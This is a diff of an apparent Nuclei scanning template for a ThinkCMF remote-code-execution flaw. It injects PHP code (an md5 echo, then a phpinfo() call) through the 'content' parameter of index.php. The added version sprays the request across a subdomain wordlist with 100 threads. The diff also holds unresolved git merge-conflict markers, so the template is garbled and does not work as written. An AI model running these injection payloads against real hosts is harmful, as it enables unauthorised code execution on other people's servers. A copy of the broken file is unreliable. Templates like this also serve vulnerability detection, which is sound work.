@@ -10,10 +10,24 @@ info:
   tags: thinkcmf,rce
 
 requests:
+<<<<<<< HEAD
   - method: GET
     path:
       - "{{BaseURL}}/index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5('ThinkCMF');"
+=======
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+>>>>>>> 18ddf72b (add new stuff)
 
+    raw:
+      - |
+        GET /index.php?g=g&m=Door&a=index&content=<?php%20phpinfo(); HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
     matchers-condition: and
     matchers:
       - type: word
